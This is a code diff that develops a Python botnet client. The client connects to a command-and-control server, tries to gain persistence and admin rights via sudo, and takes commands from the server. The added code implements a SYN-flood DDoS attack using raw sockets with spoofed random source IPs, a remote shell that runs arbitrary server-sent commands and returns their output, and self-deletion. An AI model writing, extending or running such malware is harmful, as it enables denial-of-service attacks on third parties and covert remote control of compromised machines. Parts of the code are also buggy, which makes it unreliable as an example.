@@ -7,8 +7,15 @@ import random
 import socket
 import ipaddress
 import struct
+import subprocess
 
 HOST, PORT = ('127.0.0.1', 8888)
+
+reader:asyncio.StreamReader = None
+writer:asyncio.StreamWriter = None
+
+def get_arg(tokens:list, arg_token:str):
+    return str(tokens[tokens.index(arg_token) + 1])
 
 async def setup():
     await try_connect_to_server()
@@ -76,12 +83,15 @@ def get_persistance_and_admin():
             sudo_command = f'sudo /usr/bin/python3 {script_path}'
             subprocess.run(sudo_command, shell=True, check=True)
 
+#? Ran when trying to connect, and if the connection is failed
 async def try_connect_to_server():
+    global reader, writer
+    
     try:
         reader, writer = await asyncio.wait_for(asyncio.open_connection(HOST, PORT), timeout=5)
         print("(+) Connected")
         
-        await connected_to_server(reader)
+        await connected_to_server()
         
         await try_connect_to_server()
     except (ConnectionRefusedError, TimeoutError):
@@ -91,50 +101,85 @@ async def try_connect_to_server():
     finally:
         await try_connect_to_server()
     
-
-async def connected_to_server(reader:asyncio.StreamReader):
+#? Ran when the client is connected to the server, this function handles all the comms
+async def connected_to_server():   
+    #? Check for messages from the server
     while True:
         data = await reader.read(1024)
         if not data:
             break
         
+        #? Ready the commands
         tokens = data.decode().split()
         command = tokens[0]
         
+        #! Debug reasons
+        print(tokens)
+        print(command)
+        
+        #? All the commands are run from here
         if command == "delete_self":
+            writer.close()
+            await writer.wait_closed()
             await delete_self()
-        elif command == "ddos":
-            await syn_flood(tokens)
-        
-#? Can be used for a DDos attack
-async def syn_flood(tokens):
-    try:
-        target_ip = str(tokens["-ip" + 1])
-        target_port = str(tokens["-port"] + 1)
-        
-        source_port = random.randint(1024, 65535)
-        
-        #Set up a raw socket, so we can specify our own IP and TCP Header
-        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        
-        #Craft IP header
-        source_ip = str(ipaddress.IPv4Address(random.randint(0, 2**32)))
-        ip_header = b'\x45\x00\x00\x28' + b'\xab\xcd\x00\x00' + b'\x40\x06\x00\x00' + socket.inet_aton(source_ip) + socket.inet_aton(target_ip)
-        
-        #Craft TCP header
-        syn_packet = b'\x00\x00' + struct.pack('!HH', source_port, int(target_port)) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00' + b'\x00\x00\x00\x00'
-        
-        #Send SYN packet
-        raw_socket.sendto(ip_header + syn_packet, (target_ip, int(target_port)))
-        
-        print("SYN packet sent")
-    except Exception as e:
-        print(f"Error sending SYN packet: {e}")
-        
+        elif command == "flood":
+            flood_task = asyncio.create_task(flood(tokens))
+        elif command == "stop_flood":
+            flood_task.cancel()
+            await flood_task
+        elif command == "shell":
+            tokens = tokens[1:]
+            await shell(tokens)
+            
 async def delete_self():
-    self_path = os.path.realpath(__path__)
+    self_path = os.path.realpath(__file__)
     os.remove(self_path)
+            
+#? Can be used for a DDos attack
+async def flood(tokens:list):
+    while True:
+        try:
+            #? Set up the arguments
+            target_ip = get_arg(tokens, "-ip")
+            target_port = get_arg(tokens, "-port")
+            
+            source_port = random.randint(1024, 65535)
+            
+            #?Set up a raw socket, so we can specify our own IP and TCP Header
+            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            
+            #?Craft IP header
+            source_ip = str(ipaddress.IPv4Address(random.randint(0, 2**32)))
+            ip_header = b'\x45\x00\x00\x28' + b'\xab\xcd\x00\x00' + b'\x40\x06\x00\x00' + socket.inet_aton(source_ip) + socket.inet_aton(target_ip)
+            
+            #?Craft TCP header
+            syn_packet = b'\x00\x00' + struct.pack('!HH', source_port, int(target_port)) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00' + b'\x00\x00\x00\x00'
+            
+            #?Send SYN packet
+            raw_socket.sendto(ip_header + syn_packet, (target_ip, int(target_port)))
+            
+            print("SYN packet sent")
+        except Exception as e:
+            print(f"Error sending SYN packet: {e}")
+        except asyncio.CancelledError:
+            print("Flooding was stopped by the server")
+        
+        await asyncio.sleep(0.01)
+
+async def shell(tokens:list):
+    command = " ".join(tokens)
+    
+    try: 
+        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        stdout = result.stdout
+        stderr = result.stderr
+        for line in result.stdout.splitlines():
+            server_response = "".join(line)
+        writer.write(server_response.encode())
+    except Exception as e:
+        print(e)
+        writer.write("Does not exist".encode())
 
 if __name__ == "__main__":
     asyncio.run(setup())
